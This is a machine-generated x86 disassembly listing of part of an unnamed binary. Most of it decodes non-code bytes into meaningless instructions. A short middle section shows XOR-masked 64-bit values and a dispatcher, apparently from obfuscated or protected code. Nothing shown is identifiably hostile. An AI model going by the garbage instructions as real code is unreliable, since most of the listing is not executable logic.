  41ec47:	ins    BYTE PTR es:[edi],dx
  41ec48:	inc    ebx
  41ec49:	je     0x41ec11
  41ec4b:	je     0x41ebcd
  41ec4d:	ror    BYTE PTR [eax],0xb8
  41ec50:	mov    cl,0x6
  41ec52:	cld    
  41ec53:	(bad)  
  41ec54:	fs scas al,BYTE PTR es:[edi]
  41ec56:	les    ebx,FWORD PTR [ebx]
  41ec58:	push   ecx
  41ec59:	loope  0x41ec89
  41ec5b:	jne    0x41ec9e
  41ec5d:	and    eax,0x2d199df6
  41ec62:	loop   0x41ec86
  41ec64:	xchg   edi,eax
  41ec65:	or     esp,eax
  41ec67:	(bad)  
  41ec68:	and    dl,bh
  41ec6a:	cmp    eax,0xd3cfe5b1
  41ec6f:	sbb    dh,BYTE PTR [eax+edx*1]
  41ec72:	repnz adc al,0xc3
  41ec75:	sub    BYTE PTR [ecx],cl
  41ec77:	out    0x12,eax
  41ec79:	mov    al,ds:0x2dfce065
  41ec7e:	jae    0x41ec16
  41ec80:	imul   edi,DWORD PTR [edx-0x6f],0x48
  41ec84:	pop    esp
  41ec85:	ins    DWORD PTR es:[edi],dx
  41ec86:	sbb    BYTE PTR [edx+ecx*2+0xe],cl
  41ec8a:	popf   
  41ec8b:	push   cs
  41ec8c:	retf   0xf49d
  41ec8f:	jmp    0x3adca5db
  41ec94:	out    0xb1,al
  41ec96:	pop    ds
  41ec97:	jle    0x41ec85
  41ec99:	add    bl,BYTE PTR [ecx+0x38998b47]
  41ec9f:	in     al,0x7e
  41eca1:	out    0x77,eax
  41eca3:	sbb    bh,al
  41eca5:	jmp    0x2ff316dd
  41ecaa:	daa    
  41ecab:	jae    0x41ecfa
  41ecad:	aam    0x71
  41ecaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecb0:	rcr    DWORD PTR [ecx+0x6725e6a5],cl
  41ecb6:	mov    edi,0x8c2d1638
  41ecbb:	cmp    bh,0x2f
  41ecbe:	clc    
  41ecbf:	jae    0x41ec7a
  41ecc1:	in     al,0x1b
  41ecc3:	sti    
  41ecc4:	xchg   ebp,eax
  41ecc5:	in     al,0x3d
  41ecc7:	cmp    ah,BYTE PTR [edx-0x20ea618b]
  41eccd:	icebp  
  41ecce:	add    DWORD PTR [esi+0x5d],0x5480d623
  41ecd5:	or     DWORD PTR [ebx+0x26],ebp
  41ecd8:	pushf  
  41ecd9:	add    DWORD PTR [esi],esp
  41ecdb:	scas   al,BYTE PTR es:[edi]
  41ecdc:	out    0x29,al
  41ecde:	pop    eax
  41ecdf:	icebp  
  41ece0:	adc    dh,BYTE PTR [ebx]
  41ece2:	sub    esp,ebp
  41ece4:	xchg   edi,eax
  41ece5:	out    0x34,eax
  41ece7:	cmc    
  41ece8:	fwait
  41ece9:	adc    ebx,DWORD PTR [ebx+0x3c]
  41ecec:	rcl    dh,0x13
  41ecef:	repnz sub eax,0x80f0df28
  41ecf5:	jecxz  0x41ed5b
  41ecf7:	test   eax,0x12c322c
  41ecfc:	sub    ebx,DWORD PTR [edi]
  41ecfe:	sbb    dh,BYTE PTR [ebx]
  41ed00:	(bad)  
  41ed01:	mov    dh,0x3
  41ed03:	jmp    0x41ecbf
  41ed05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed06:	fisttp DWORD PTR [edi+0x4d40d757]
  41ed0c:	jnp    0x41ed64
  41ed0e:	jne    0x41ed4c
  41ed10:	icebp  
  41ed11:	add    ah,BYTE PTR [esi+eax*8+0x19]
  41ed15:	not    DWORD PTR [esi-0x38cfa7d0]
  41ed1b:	adc    al,0x5
  41ed1d:	dec    edx
  41ed1e:	xchg   BYTE PTR [ebx-0x3829b25c],ch
  41ed24:	fst    QWORD PTR [ecx-0x1d6778c4]
  41ed2a:	add    ah,cl
  41ed2c:	lods   eax,DWORD PTR ds:[esi]
  41ed2d:	adc    al,0xfe
  41ed2f:	jo     0x41ed20
  41ed31:	leave  
  41ed32:	xchg   edx,eax
  41ed33:	pop    ds
  41ed34:	xor    eax,0x2d78d452
  41ed39:	or     eax,0x6acb8b94
  41ed3e:	xchg   edi,eax
  41ed3f:	stos   BYTE PTR es:[edi],al
  41ed40:	inc    esi
  41ed41:	test   BYTE PTR ds:0xb3120a6f,0x8e
  41ed48:	mov    WORD PTR [ecx+0x4bba5093],?
  41ed4e:	jmp    0x66cf6595
  41ed53:	dec    ebx
  41ed54:	xor    BYTE PTR [eax+0x34],bl
  41ed57:	push   edi
  41ed58:	or     al,BYTE PTR [eax+0x1e]
  41ed5b:	mov    ebp,0x13dbf7d0
  41ed60:	add    bh,BYTE PTR [edx+esi*1+0x5d]
  41ed64:	push   edi
  41ed65:	sti    
  41ed66:	push   ds
  41ed67:	add    eax,0xa5c7b309
  41ed6c:	inc    edi
  41ed6d:	xchg   edi,eax
  41ed6e:	push   ebp
  41ed6f:	cdq    
  41ed70:	jbe    0x41edd8
  41ed72:	push   esp
  41ed73:	mov    edi,es
  41ed75:	xor    eax,0x8989620b
  41ed7a:	add    al,0x98
  41ed7c:	gs add al,0xc0
  41ed7f:	pop    ss
  41ed80:	imul   edi,DWORD PTR [ebx-0x77d3fb3d],0xe8ddc753
  41ed8a:	imul   esp,ebp,0x23
  41ed8d:	dec    esp
  41ed8e:	out    dx,al
  41ed8f:	mov    edi,0x2213b59d
  41ed94:	call   0x4bf1:0x8f6b4f2f
  41ed9b:	ret    0x7e81
  41ed9e:	daa    
  41ed9f:	repz js 0x41ed9a
  41eda2:	inc    edi
  41eda3:	rcr    DWORD PTR ds:0x8dfc9eaf,1
  41eda9:	adc    edx,esp
  41edab:	ins    BYTE PTR es:[edi],dx
  41edac:	xor    bl,bl
  41edae:	cld    
  41edaf:	or     esi,edx
  41edb1:	add    eax,0x6080862a
  41edb6:	push   edx
  41edb7:	and    al,BYTE PTR [esi-0x23]
  41edba:	imul   esi,DWORD PTR [edx],0xffffff9e
  41edbd:	inc    ebp
  41edbe:	out    0x84,al
  41edc0:	mov    al,ds:0x3efc3d8b
  41edc5:	rcl    ebp,0x7b
  41edc8:	inc    cx
  41edca:	(bad)  
  41edcc:	gs xchg edi,eax
  41edce:	sbb    DWORD PTR [edx],0xde5c229e
  41edd4:	pop    eax
  41edd5:	adc    al,0x9c
  41edd7:	sbb    BYTE PTR [edx+0x7eb0b628],cl
  41eddd:	inc    edi
  41edde:	retf   
  41eddf:	push   0x5b4bc976
  41ede4:	dec    edx
  41ede5:	mov    bl,0xbd
  41ede7:	call   0x8423eb71
  41edec:	leave  
  41eded:	addr16 es inc esi
  41edf0:	jbe    0x41eda6
  41edf2:	outs   dx,DWORD PTR ds:[esi]
  41edf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf4:	pusha  
  41edf5:	je     0x41edfd
  41edf7:	test   eax,0xe1beb1d8
  41edfc:	push   ecx
  41edfd:	call   0xa037ce6
  41ee02:	or     dl,ch
  41ee04:	jmp    0xf134b3d6
  41ee09:	jns    0x41edf6
  41ee0b:	out    dx,al
  41ee0c:	pop    eax
  41ee0d:	dec    eax
  41ee0e:	mov    ch,BYTE PTR [edx]
  41ee10:	daa    
  41ee11:	dec    esi
  41ee12:	mov    ebp,DWORD PTR [ebx-0x17]
  41ee15:	dec    ebx
  41ee16:	repz adc bl,BYTE PTR [eax]
  41ee19:	das    
  41ee1a:	icebp  
  41ee1b:	jp     0x41edbf
  41ee1d:	emms   
  41ee1f:	fisttp QWORD PTR [ebp-0x10ba4b09]
  41ee25:	test   eax,0xe7c778b2
  41ee2a:	push   edx
  41ee2b:	pop    ebx
  41ee2c:	outs   dx,DWORD PTR ds:[esi]
  41ee2d:	rol    ecx,0x4e
  41ee30:	mov    edx,0xf339642c
  41ee35:	jne    0x41ee08
  41ee37:	jbe    0x41ee79
  41ee39:	pop    DWORD PTR [eax+0x68]
  41ee3c:	push   ecx
  41ee3d:	dec    BYTE PTR [eax+0x4988cd6e]
  41ee43:	push   edx
  41ee44:	stos   BYTE PTR es:[edi],al
  41ee45:	faddp  st(6),st
  41ee47:	cmc    
  41ee48:	sub    ch,cl
  41ee4a:	push   0x56
  41ee4c:	push   0x36
  41ee4e:	sub    BYTE PTR [ebp+0x3a],dh
  41ee51:	jno    0x41edf5
  41ee53:	cmp    DWORD PTR cs:[ebx+ebp*8-0x5b50c8a9],esp
  41ee5b:	pop    ecx
  41ee5c:	sbb    al,0x53
  41ee5e:	ds (bad) 
  41ee60:	mov    bl,0x1d
  41ee62:	test   al,0xe
  41ee64:	cmp    edx,DWORD PTR [eax+eax*2]
  41ee67:	mov    bh,0x7d
  41ee69:	add    BYTE PTR [esi-0x74d2d268],dh
  41ee6f:	xor    ah,BYTE PTR [ebx+0x7a]
  41ee72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee73:	mov    ebx,0x66b07e0b
  41ee78:	and    cl,ch
  41ee7a:	adc    al,al
  41ee7c:	scas   al,BYTE PTR es:[edi]
  41ee7d:	scas   al,BYTE PTR es:[edi]
  41ee7e:	stos   BYTE PTR es:[edi],al
  41ee7f:	fstp   TBYTE PTR [ecx-0x4b]
  41ee82:	pop    ebx
  41ee83:	neg    BYTE PTR [edi+esi*2]
  41ee86:	pop    ss
  41ee87:	int    0x3b
  41ee89:	in     eax,dx
  41ee8a:	cmp    BYTE PTR [eax+0x79a8e64f],al
  41ee90:	mov    cl,0x27
  41ee92:	push   esi
  41ee93:	adc    ebx,DWORD PTR [ebp+esi*4-0x1e]
  41ee97:	inc    eax
  41ee98:	outs   dx,DWORD PTR ds:[esi]
  41ee99:	adc    al,0xa8
  41ee9b:	pop    edi
  41ee9c:	aas    
  41ee9d:	jg     0x41eeef
  41ee9f:	mov    edi,ebx
  41eea1:	daa    
  41eea2:	inc    edi
  41eea3:	adc    ch,dl
  41eea5:	mov    DWORD PTR [edi-0x9f6e73],eax
  41eeab:	outs   dx,DWORD PTR ds:[esi]
  41eeac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eead:	add    al,0xdc
  41eeaf:	ss test eax,0xf183f144
  41eeb5:	cli    
  41eeb6:	shr    DWORD PTR [ecx+edx*1],1
  41eeb9:	mov    ch,0xb0
  41eebb:	call   0xe7506bf5
  41eec0:	mov    bl,0xa6
  41eec2:	(bad)  
  41eec4:	mov    ebp,0xcc8aae14
  41eec9:	aam    0x9b
  41eecb:	mov    dl,0xc9
  41eecd:	mov    dl,0x92
  41eecf:	xchg   ecx,eax
  41eed0:	mov    BYTE PTR [edx],cl
  41eed2:	cmp    bh,BYTE PTR [edx-0x5ca5a6b9]
  41eed8:	sbb    DWORD PTR [edx],ebx
  41eeda:	fcmovb st,st(3)
  41eedc:	mov    fs,WORD PTR [edx+edi*2-0x6e4ffda3]
  41eee3:	fs inc ebp
  41eee5:	ret    0x6c51
  41eee8:	cmp    al,0xd8
  41eeea:	scas   eax,DWORD PTR es:[edi]
  41eeeb:	push   es
  41eeec:	sbb    BYTE PTR [edi],0xa3
  41eeef:	fstp   st(2)
  41eef1:	pop    ebx
  41eef2:	mov    dl,0xcd
  41eef4:	lods   al,BYTE PTR ds:[esi]
  41eef5:	mov    ds:0xbf43e4cb,al
  41eefa:	sbb    al,0xbb
  41eefc:	jae    0x41ee87
  41eefe:	loop   0x41eece
  41ef00:	pop    ebx
  41ef01:	mov    cs,WORD PTR [ecx]
  41ef03:	pop    ebx
  41ef04:	mov    bl,ch
  41ef06:	or     edx,DWORD PTR [edi]
  41ef08:	xchg   esp,eax
  41ef09:	js     0x41ef0f
  41ef0b:	jg     0x41ef7b
  41ef0d:	push   es
  41ef0e:	dec    ebx
  41ef0f:	adc    BYTE PTR [edi+0x37fa50b2],al
  41ef15:	adc    eax,0x94b31ec9
  41ef1a:	lds    ecx,FWORD PTR [ebx]
  41ef1c:	fisub  DWORD PTR [eax]
  41ef1e:	xor    dh,0x3a
  41ef21:	lods   eax,DWORD PTR ds:[esi]
  41ef22:	call   0x32073cff
  41ef27:	lods   eax,DWORD PTR ds:[esi]
  41ef29:	les    ebx,FWORD PTR [ebx-0x35]
  41ef2c:	aas    
  41ef2d:	shl    DWORD PTR [edi],1
  41ef2f:	and    eax,0x3b29cab9
  41ef34:	aad    0x19
  41ef36:	sub    eax,0x8233ffe
  41ef3b:	mov    al,0x64
  41ef3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef3e:	adc    bh,BYTE PTR [ecx+0x3a]
  41ef41:	cmc    
  41ef42:	aad    0x4a
  41ef44:	mov    ch,al
  41ef46:	mov    ah,0x20
  41ef48:	pop    ds
  41ef49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef4a:	adc    BYTE PTR [ecx+0x25],ch
  41ef4d:	out    0x55,eax
  41ef4f:	mov    edx,0x4eacd3c7
  41ef54:	repz add ebx,DWORD PTR [esi-0x3d6a4152]
  41ef5b:	aas    
  41ef5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5d:	arpl   cx,si
  41ef5f:	inc    esp
  41ef60:	mov    dh,0x52
  41ef62:	pop    edi
  41ef63:	dec    ebp
  41ef64:	mov    ?,WORD PTR [ecx-0x633492d]
  41ef6a:	jmp    0x41ef86
  41ef6c:	push   ss
  41ef6d:	into   
  41ef6e:	out    dx,eax
  41ef6f:	xchg   DWORD PTR [edx+0x1c623e71],esi
  41ef75:	rcr    DWORD PTR [edx],cl
  41ef77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef78:	pop    edx
  41ef79:	das    
  41ef7a:	push   ebp
  41ef7b:	sub    al,0x69
  41ef7d:	inc    esp
  41ef7e:	fsubr  DWORD PTR [ebx+0x47]
  41ef81:	iret   
  41ef82:	and    al,0x0
  41ef84:	popf   
  41ef85:	je     0x41efbd
  41ef87:	inc    esp
  41ef88:	aas    
  41ef89:	adc    esi,edx
  41ef8b:	ret    0xddb5
  41ef8e:	mov    bl,0xd6
  41ef90:	fmul   DWORD PTR [ecx+ecx*4]
  41ef93:	add    BYTE PTR [ecx-0x6adaad4f],bl
  41ef99:	push   0x59
  41ef9b:	nop
  41ef9c:	scas   eax,DWORD PTR es:[edi]
  41ef9d:	cs in  eax,0xf5
  41efa0:	mov    ecx,0x10d6b1b6
  41efa5:	mov    edi,0xc0354e40
  41efaa:	not    DWORD PTR [esi-0x78]
  41efad:	xor    BYTE PTR [ebx-0x557924a1],dl
  41efb3:	jmp    0x41ef8f
  41efb5:	div    DWORD PTR [ebp+0x14a35fdd]
  41efbb:	xchg   edi,eax
  41efbc:	ins    BYTE PTR es:[edi],dx
  41efbd:	int    0xde
  41efbf:	fwait
  41efc0:	out    dx,al
  41efc1:	jns    0x41efe8
  41efc3:	add    BYTE PTR [edx],0xa6
  41efc6:	sub    bh,dl
  41efc8:	push   ecx
  41efc9:	cmp    BYTE PTR [ebx],ah
  41efcb:	inc    ebx
  41efcc:	fdiv   DWORD PTR [edx]
  41efce:	adc    BYTE PTR [esi],dl
  41efd0:	(bad)  
  41efd1:	retf   0xaea7
  41efd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd5:	test   al,0x4d
  41efd7:	xchg   edi,eax
  41efd8:	or     edx,eax
  41efda:	jne    0x41f03f
  41efdc:	jmp    0x41ef9d
  41efde:	mov    BYTE PTR [ecx],ch
  41efe0:	mov    edx,0x4b23c424
  41efe5:	cmp    esi,ebp
  41efe7:	sbb    eax,0xc8c48f18
  41efec:	xor    BYTE PTR [esi],0xa9
  41efef:	scas   eax,DWORD PTR es:[edi]
  41eff0:	mov    edx,DWORD PTR [di-0x150]
  41eff5:	(bad)  
  41eff6:	push   DWORD PTR ds:0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x4223f7
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x4223f7
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x4223f7
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x4223f7
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x4223f7
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	jge    0x41f21e
  41f1c0:	sub    dl,cl
  41f1c2:	sar    BYTE PTR [edi-0x40],0xbe
  41f1c6:	dec    edx
  41f1c7:	les    edi,FWORD PTR [esi+0x787a15be]
  41f1cd:	fcmovnbe st,st(5)
  41f1cf:	in     eax,0x43
  41f1d1:	xchg   ebp,eax
  41f1d2:	push   0x3c
  41f1d4:	mov    edi,0x164b29b6
  41f1d9:	push   es
  41f1da:	jg     0x41f181
  41f1dc:	and    al,0xb
  41f1de:	pop    edx
  41f1df:	pop    ecx
  41f1e0:	in     eax,0x99
  41f1e2:	icebp  
  41f1e3:	sub    eax,0x9fcd94b4
  41f1e8:	push   0xe53b5c3
  41f1ed:	fiadd  DWORD PTR [ecx]
  41f1ef:	or     eax,0xb646418e
  41f1f4:	dec    edx
  41f1f5:	jmp    0x41f1e5
  41f1f7:	and    al,0x2d
  41f1f9:	mov    ds:0xd1b219fd,eax
  41f1fe:	out    0x2d,al
  41f200:	lahf   
  41f201:	(bad)  
  41f202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f203:	sbb    DWORD PTR [eax],esp
  41f205:	xlat   BYTE PTR ds:[ebx]
  41f206:	add    al,0x67
  41f208:	push   ebp
  41f209:	fcmovb st,st(0)
  41f20b:	mov    bl,dl
  41f20d:	inc    edi
  41f20e:	pop    eax
  41f20f:	mov    ah,0x53
  41f211:	dec    ecx
  41f212:	mov    bh,0x42
  41f214:	dec    edx
  41f215:	jle    0x41f23e
  41f217:	shl    DWORD PTR gs:[edx+0x1e],cl
  41f21b:	adc    eax,0xa312439a
  41f220:	xchg   ecx,eax
  41f221:	icebp  
  41f222:	fnstenv [edi+eax*2]
  41f225:	or     DWORD PTR [ebp+0x1b5d6882],edx
  41f22b:	popw   ss
  41f22d:	jle    0x41f26b
  41f22f:	push   esi
  41f230:	cmp    edi,DWORD PTR [esi+0x70]
  41f233:	sbb    eax,0x5cc5d3aa
  41f238:	test   ebp,0xd56be2b3
  41f23e:	jae    0x41f202
  41f240:	jno    0x41f225
  41f242:	jns    0x41f236
  41f244:	jno    0x41f287
  41f246:	and    al,0x75
  41f248:	aaa    
  41f249:	pushf  
  41f24a:	cmp    BYTE PTR [edx-0x5b],0x55
  41f24e:	xchg   ebx,eax
  41f24f:	jmp    0x41f282
  41f251:	xchg   edx,eax
  41f252:	xor    al,0x1b
  41f254:	jno    0x41f237
  41f256:	mov    ds:0x29dbfdf3,eax
  41f25b:	or     eax,DWORD PTR [ecx+0xa]
  41f25e:	nop
  41f25f:	cld    
  41f260:	xlat   BYTE PTR ds:[ebx]
  41f261:	cvttps2pi mm0,xmm1
  41f264:	and    bl,BYTE PTR [edx-0x1e]
  41f267:	mov    eax,0x11f92d53
  41f26c:	pop    edi
  41f26d:	jg     0x41f2d0
  41f26f:	loop   0x41f1fc
  41f271:	mov    ch,0xe7
  41f273:	fisubr DWORD PTR [ebx-0x41ef083d]
  41f279:	inc    esp
  41f27a:	fdiv   DWORD PTR [ebp+0x2]
  41f27d:	xchg   DWORD PTR [esi-0x64],esi
  41f280:	test   eax,0xd166b4e2
  41f285:	(bad)  
  41f286:	mov    eax,0x2558e547
  41f28b:	jg     0x41f250
  41f28d:	pop    edx
  41f28e:	push   edi
  41f28f:	xor    DWORD PTR [esi+0x7079666d],edi
  41f295:	stos   DWORD PTR es:[edi],eax
  41f296:	sub    edx,eax
  41f298:	es jb  0x41f26a
  41f29b:	sbb    DWORD PTR [edx+ebx*2+0x3b7a8dc3],esi
  41f2a2:	jo     0x41f307
  41f2a4:	dec    eax
  41f2a5:	out    dx,eax
  41f2a6:	shl    ebx,cl
  41f2a8:	push   0xffffff83
  41f2aa:	mov    ds:0x93ffa095,al
  41f2af:	fcomp  QWORD PTR [edx]
  41f2b1:	mov    al,0x51
  41f2b3:	xor    DWORD PTR [edi-0x71bda02f],ecx
  41f2b9:	mov    ?,WORD PTR ds:0x2cdd3b1f
  41f2bf:	js     0x41f2e5
  41f2c1:	mov    esp,0x843c3b08
  41f2c6:	test   DWORD PTR [edx],0xc41e66ed
  41f2cc:	cmp    BYTE PTR [ebx],0xc9
  41f2cf:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f2d1:	stos   DWORD PTR es:[edi],eax
  41f2d2:	cmc    
  41f2d3:	and    ch,dl
  41f2d5:	jbe    0x41f266
  41f2d7:	sahf   
  41f2d8:	ficomp DWORD PTR [ebp-0xfa15cd9]
  41f2de:	pop    ds
  41f2df:	cmp    ebp,edx
  41f2e1:	aam    0xf0
  41f2e3:	aaa    
  41f2e4:	hlt    
  41f2e5:	mov    edx,0x762718be
  41f2ea:	jmp    0x7f704ef6
  41f2ef:	mov    al,ds:0x7e2ab32f
  41f2f4:	loopne 0x41f31d
  41f2f6:	inc    eax
  41f2f7:	add    eax,0xb4d14399
  41f2fc:	add    eax,0xa9b286ba
  41f301:	dec    ebx
  41f302:	push   ss
  41f303:	mov    al,ds:0x23cc2aab
  41f308:	push   eax
  41f309:	mov    ebx,0xdc1fcab8
  41f30e:	fmul   DWORD PTR [edx+0x46]
  41f311:	cs jmp 0x54ce:0x348d1925
  41f319:	ret    0x2a88
  41f31c:	sbb    eax,DWORD PTR [edx-0x72358989]
  41f322:	sub    BYTE PTR [edx-0x18c4560d],0xe2
  41f329:	xor    BYTE PTR [ecx-0x67788fc3],al
  41f32f:	and    al,al
  41f331:	arpl   si,di
  41f333:	or     DWORD PTR [eax],eax
  41f335:	out    dx,eax
  41f336:	mov    dh,0x2e
  41f339:	ins    BYTE PTR es:[edi],dx
  41f33a:	ret    0xb4ff
  41f33d:	aas    
  41f33e:	adc    BYTE PTR [ebp-0x479b6d95],0x53
  41f345:	mov    ecx,0x54a9b540
  41f34a:	ret    
  41f34b:	repnz repz sub al,0x91
  41f34f:	mov    eax,ds:0xb26dac9a
  41f354:	sub    DWORD PTR [ebx+0x4c],esi
  41f357:	gs xchg esi,eax
  41f359:	pusha  
  41f35a:	sbb    dl,cl
  41f35c:	popf   
  41f35d:	(bad)  
  41f35e:	ss lock test al,0x42
  41f362:	jl     0x41f2fb
  41f364:	mov    ch,0x53
  41f366:	xor    eax,0x119f4234
  41f36b:	cld    
  41f36c:	xchg   BYTE PTR [edx+ebx*1-0x79],dh
  41f370:	(bad)  
  41f371:	int3   
  41f372:	push   eax
  41f373:	mov    eax,0x4ed61d17
  41f378:	les    ebx,FWORD PTR [esi]
  41f37a:	pop    ds
  41f37b:	mov    eax,ds:0x4d9cd1f4
  41f380:	adc    DWORD PTR [ecx+0x19],ebp
  41f383:	iret   
  41f384:	and    al,ch
  41f386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f387:	cli    
  41f388:	stos   DWORD PTR es:[edi],eax
  41f389:	adc    esi,DWORD PTR [edx+0x6b1078f2]
  41f38f:	(bad)
  41f392:	pusha  
  41f393:	mov    ds:0x4c389b93,eax
  41f398:	icebp  
  41f399:	jnp    0x41f403
  41f39b:	cmp    edx,0x0
  41f39e:	in     al,0x59
  41f3a0:	dec    esp
  41f3a1:	jns    0x41f350
  41f3a3:	add    edi,ebp
  41f3a5:	mov    esp,0xea6fea8d
  41f3aa:	inc    eax
  41f3ab:	xchg   esi,eax
  41f3ac:	adc    BYTE PTR [ecx-0x3],bh
  41f3af:	test   eax,0x15534c50
  41f3b4:	fwait
  41f3b5:	adc    dh,0xa3
  41f3b8:	xor    eax,0xbbecab3e
  41f3bd:	stos   BYTE PTR es:[edi],al
  41f3be:	jno    0x41f3e9
  41f3c0:	fwait
  41f3c1:	lds    ebp,FWORD PTR ds:0xa6deb16f
  41f3c7:	pop    edx
  41f3c8:	mov    ah,0xe2
  41f3ca:	jge    0x41f3a8
  41f3cc:	and    DWORD PTR [edx-0x4b888e00],eax
  41f3d2:	cmp    dl,BYTE PTR [eax]
  41f3d4:	xchg   BYTE PTR [esi-0x68],al
  41f3d7:	push   eax
  41f3d8:	add    esi,DWORD PTR [edi+0x19]
  41f3db:	mov    edi,0xa6c2333c
  41f3e0:	lahf   
  41f3e1:	pop    ebp
  41f3e2:	adc    DWORD PTR [edx],edx
  41f3e4:	in     eax,dx
  41f3e5:	xor    BYTE PTR [edx+0x2a],0x12
  41f3e9:	jg     0x41f413
  41f3eb:	xchg   ebp,eax
  41f3ec:	test   eax,0x14e64b89
  41f3f1:	mov    dh,0x81
  41f3f3:	(bad)  
  41f3f4:	smsw   WORD PTR [ebx+0x165777d6]
  41f3fb:	sbb    ecx,DWORD PTR [edx+eiz*8+0x38]
  41f3ff:	cs push eax
  41f401:	leave  
  41f402:	fdiv   DWORD PTR [edx-0x50]
  41f405:	ror    BYTE PTR [ebx],cl
  41f407:	mov    ch,0x8d
  41f409:	lods   al,BYTE PTR ds:[esi]
  41f40a:	xchg   esi,eax
  41f40b:	dec    ecx
  41f40c:	in     eax,0x94
  41f40e:	jbe    0x41f450
  41f410:	jg     0x41f3c6
  41f412:	add    esi,DWORD PTR [ecx]
  41f414:	aas    
  41f415:	push   edx
  41f416:	cmp    edx,DWORD PTR [esi]
  41f418:	xchg   ecx,eax
  41f419:	sub    BYTE PTR [edi+0x15cdcc2e],0x59
  41f420:	aam    0x32
  41f422:	and    eax,0xc431a368
  41f427:	lods   al,BYTE PTR ds:[esi]
  41f428:	cmp    ebx,DWORD PTR [edi+0x69]
  41f42b:	add    eax,0x18caf532
  41f430:	or     eax,0x7a6551ab
  41f435:	bound  esi,QWORD PTR [ebx+ebp*2]
